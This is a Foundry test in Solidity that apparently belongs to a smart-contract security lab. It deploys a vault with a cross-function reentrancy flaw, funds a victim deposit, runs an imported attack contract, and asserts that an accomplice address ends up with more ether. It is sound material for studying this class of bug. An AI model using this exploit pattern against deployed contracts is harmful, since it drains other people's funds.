//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CrossFunctionReentrancyVault} from "../src/cfr/CrossFunctionReentrancyVault.sol";
import {CrossFunctionAttack} from "../src/cfr/CrossFunctionAttack.sol";

contract CrossFunctionAttackTest is Test {
    CrossFunctionReentrancyVault public vault;
    CrossFunctionAttack public attackContract;

    address public accomplice = makeAddr("accomplice");
    address public owner = makeAddr("owner");
    address public victim = makeAddr("victim");

    function setUp() public {
        vault = new CrossFunctionReentrancyVault();
        vm.prank(owner);
        attackContract = new CrossFunctionAttack(payable(address(vault)), accomplice);

        vm.deal(owner, 1 ether);
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    function testCrossFunctionReentrancyAttack() public {
        uint256 initialVaultBalance = address(vault).balance;
        uint256 initialownerBalance = owner.balance;
        uint256 initialAccompliceBalance = accomplice.balance;

        console.log("Initial Vault Balance:", initialVaultBalance);
        console.log("Initial Owner Balance:", initialownerBalance);
        console.log("Initial Accomplice Balance:", initialAccompliceBalance);

        vm.prank(owner);
        attackContract.attack{value: 1 ether}();

        vm.prank(owner);
        attackContract.withdrawProfit();

        vm.prank(accomplice);
        vault.withdraw();

        uint256 finalVaultBalance = address(vault).balance;
        uint256 finalOwnerBalance = owner.balance;
        uint256 finalAccompliceBalance = accomplice.balance;

        console.log("Final Vault Balance:", finalVaultBalance);
        console.log("Final Owner Balance:", finalOwnerBalance);
        console.log("Final Accomplice Balance:", finalAccompliceBalance);

        assertGt(finalAccompliceBalance, initialAccompliceBalance, "Accomplice balance should increase");
        assertEq(finalOwnerBalance, initialownerBalance);


    }
}